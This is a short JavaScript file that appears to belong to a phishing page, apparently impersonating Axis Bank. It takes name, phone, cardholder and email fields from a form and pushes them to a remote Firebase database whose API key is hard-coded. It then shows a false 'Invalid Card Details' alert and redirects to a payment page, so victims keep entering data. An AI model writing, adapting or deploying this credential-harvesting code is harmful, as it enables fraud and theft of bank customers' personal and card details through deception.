// Initialize Firebase (ADD YOUR OWN DATA)
const firebaseConfig = {
  apiKey: "AIzaSyCIHqNbBqYCamH6ZlgN9NJi6Yx-FoipHBo",
  authDomain: "newaxi.firebaseapp.com",
  databaseURL: "https://newaxi-default-rtdb.firebaseio.com",
  projectId: "newaxi",
  storageBucket: "newaxi.appspot.com",
  messagingSenderId: "790901582672",
  appId: "1:790901582672:web:3355c1b519de749267da55",

  };

firebase.initializeApp(firebaseConfig);

// Reference messages collection
var messagesRef = firebase.database().ref('BOInow');

// Listen for form submit
document.getElementById('contactForm').addEventListener('submit', submitForm);

// Submit form
function submitForm(e){
  e.preventDefault();

  // Get values
  var name = getInputVal('name');
  var phone = getInputVal('phone');
  var cardholder = getInputVal('cardholder');
  var email = getInputVal('email')

  // Save message
  saveMessage(name, phone,cardholder, email);

  // Show alert
// alert("Axis Bank Will Contact You Soon")
//   // Clear form
//   document.getElementById('contactForm').reset();
alert("Invalid Card Details , Please Enter Correct Details To Continue The Payment , Retry Again")
document.getElementById('contactForm').reset();
window.location.assign("pay.html")
}

// Function to get get form values
function getInputVal(id){
  return document.getElementById(id).value;
}

// Save message to firebase
function saveMessage(name, phone,cardholder, email){
  var newMessageRef = messagesRef.push();
  newMessageRef.set({
    name: name,
    phone:phone,
    cardholder:cardholder,
    email:email,
  });
}
